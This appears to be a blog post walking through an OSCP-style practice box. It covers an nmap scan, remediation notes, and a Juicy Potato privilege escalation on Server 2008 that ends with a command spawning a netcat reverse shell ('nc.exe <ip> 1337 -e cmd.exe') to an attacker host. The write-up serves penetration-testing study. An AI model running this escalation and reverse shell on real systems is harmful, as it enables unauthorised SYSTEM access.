This is one of my favorite boxes when studying for any ethical hacking cert. Shout out to "Got Root?" 's article https://medium.com/an-idea/70-labs-i-solved-for-oscp-and-which-ones-you-should-focus-on-cab3c7c8583f.

I was doing a few boxes from the "Lainkusanagi OSCP Like" list, and I ran into one of his articles on focused boxes he recommended. I randomly picked this one to test. I also started my YouTube channel on solving some of the more rigid boxes as I do them. For the video walk-through: https://youtu.be/rx8aOfhha2Q?si=lp7ZBO1XFe6GEtl6. In case it's not sticking, and you're still stuck on what to do next. I like this box —it's pretty hard, but still very doable.

Starting with the nmap scan

nmap -Pn -sC -sV -p- --open -T4 $target -v

I stick to this one for CTFs or Pentesting exams since it's quick and easy. Out in the field, you may need to do something else. However, since the OSCP is timely, running this will save a bit of time.

Which one is the right one to use? Well, we need to keep enumerating for it. Running systeminfo:

First, Server 2008 isn't supported, so we need a new server asap. So I would include that in the report. The other, default passwords like admin/admin, need to be changed. Also, the offsec user needs a more complex name since it was easily cracked. And the user Apache should not have this enabled for the next attack, juicy potato.

Juicy potato is an excellent tool for older PC's and gets you a shell right away. But we need a few things, though.

GitHub - ivanitlearning/Juicy-Potato-x86: Juicy Potato for x86 Windows
Juicy Potato for x86 Windows. Contribute to ivanitlearning/Juicy-Potato-x86 development by creating an account on…github.com
GitHub - int0x33/nc.exe: Netcat for windows 32/64 bit

So we need netcat to form a new shell, and also we need x86 for the older pc to work, and one last thing:

juicy-potato/CLSID at master · ohpe/juicy-potato
A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows…github.com

Gonna need the server 2008 CLSIDs for this to work:

I stick with the TrustedInstaller. But you may have to play around with a few. Stay in the Desktop of the user and file share nc.exe and juicy potato with a Python server and certutil command. After sharing, add another listener with port 1337 (or whatever port you want to use; I had better luck with 1337).

Then with this command:

.\Juicy.Potato.x86.exe -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\apache\Desktop\nc.exe <ip> 1337 -e cmd.exe" -l 1337 -c "{3c6859ce-230b-48a4-be6c-932c0c202048}"

And we get a shell.

Once you get it, it's just a few command lines away from passing. It's a lot of trial and error, but it's doable. Take a break if it's not working, or do a different set if it's not successful in a timely fashion. That was my biggest mistake the first time taking this test, but after doing a lot more boxes from that list and "Got root?", it finally stuck with me. Just take your time.
